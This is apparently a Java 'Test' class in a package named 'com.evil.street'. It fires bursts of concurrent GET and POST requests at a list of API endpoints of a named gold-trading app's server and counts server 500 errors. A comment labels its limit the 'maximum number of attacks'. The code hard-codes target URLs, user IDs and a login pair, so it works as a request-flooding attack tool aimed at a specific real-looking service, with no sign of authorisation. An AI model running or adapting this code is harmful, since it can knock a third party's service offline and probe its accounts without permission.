package com.evil.street;

import java.awt.EventQueue;

import javax.swing.JFrame;
import javax.swing.JPanel;
import java.awt.BorderLayout;
import java.awt.FlowLayout;
import java.awt.GridBagLayout;
import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Date;
import java.util.HashMap;
import java.util.List;
import java.util.Map;
import java.awt.CardLayout;
import javax.swing.JButton;
import javax.swing.SpringLayout;
import javax.swing.JTextField;
import javax.swing.JCheckBox;
import javax.swing.JLabel;
import javax.swing.JTextArea;
import javax.swing.JComboBox;
import javax.swing.JScrollPane;
import javax.swing.DropMode;
import javax.swing.SwingConstants;

public class Test {
	public static final int MAX_NUM = 10000;// 最大攻击次数
	public static int maxNum = MAX_NUM;// 最大攻击次数
	public static int ErrorNum = 0;

	public static final String[] mUrl = new String[] { "http://app.yuanyanggold.com/api/Activities/activity_list",
			"http://app.yuanyanggold.com/api/Center/index", "http://app.yuanyanggold.com/api/User/signIn",
			"http://app.yuanyanggold.com/api/User/Record", "http://app.yuanyanggold.com/api/User/login",
			"http://app.yuanyanggold.com/api/Welcome/welcome", "http://app.yuanyanggold.com/api/Search/look",
			"http://app.yuanyanggold.com/api/Forum/browse", "http://app.yuanyanggold.com/api/Index/message",
			"http://app.yuanyanggold.com/api/Index/newProducts" };
	public static final boolean[] mPost = new boolean[] { false, false, false, false, true, true, false, false, false,
			false };

	public static final HashMap<String, String>[] map = new HashMap[] { null, new HashMap<>(), new HashMap<>(),
			new HashMap<>(), new HashMap<>(), null, new HashMap<>(), new HashMap<>(), new HashMap<>(),
			new HashMap<>() };

	public static void main(String[] args) {
		map[1].put("UserID", "10");
		map[2].put("UserID", "2");
		map[3].put("UserID", "20");
		map[4].put("AccountNum", "king");
		map[4].put("PassWord", "123456");
		map[6].put("title", "年");
		map[6].put("UserID", "2");
		map[7].put("ForumID", "12");
		map[8].put("UserID", "32");
		map[9].put("p", "1");
		map[9].put("num", "50");
		startThread();
	}

	public static void startThread() {
		// for (int i = 0; i < mUrl.length; i++) {
		int i = 1;
		if (mPost[i]) {
			for (int j = 0; j < 50; j++) {
				HttpRequest.POST(mUrl[i], map[i], new HttpRequestCallback() {

					@Override
					public boolean response(int responseCode) {
						return false;
					}

					@Override
					public void response(int responseCode, String url, int num) {
						// System.out.println(url + " responseCode:" +
						// responseCode + " num:" + num);
						if (responseCode == 500) {
							ErrorNum++;
							System.err.println("error:" + ErrorNum + " num = " + num);
						}
					}

					@Override
					public void response(int responseCode, String respone) {

					}

					@Override
					public void failure(String error) {
						System.out.println(error);
					}
				});
			}
		} else {
			for (int j = 0; j < 50; j++) {
				HttpRequest.GET(mUrl[i], map[i], new HttpRequestCallback() {

					@Override
					public boolean response(int responseCode) {
						return false;
					}

					@Override
					public void response(int responseCode, String url, int num) {
						if (responseCode == 500) {
							ErrorNum++;
							System.err.println("error:" + ErrorNum + " num = " + num);
						}
						// System.out.println(url + " responseCode:" +
						// responseCode
						// + " num:" + num);
					}

					@Override
					public void response(int responseCode, String respone) {
					}

					@Override
					public void failure(String error) {
						System.out.println(error);
					}
				});
			}
		}
		// }
	}

	public static void log(String msg) {
		SimpleDateFormat sdf = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss:SSS   ");
		Date da = new Date();
		String time = sdf.format(da);
		System.out.println(time + msg);
	}
}
